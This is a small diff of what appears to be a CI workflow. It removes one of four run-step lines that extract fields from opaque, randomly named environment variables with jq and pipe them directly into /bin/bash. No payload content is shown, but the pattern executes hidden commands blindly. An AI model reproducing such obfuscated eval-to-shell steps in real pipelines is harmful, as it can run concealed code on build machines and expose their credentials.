@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$ozerh80" | jq -r .thoml46039 | /bin/bash
           printf '%s' "$y6580" | jq -r .o72851 | /bin/bash
-          echo $zvxb00030 | jq -r .y51 | /bin/bash
           printf '%s' "$w74" | jq -r .gl9831 | /bin/bash
 
       - name: Persist results
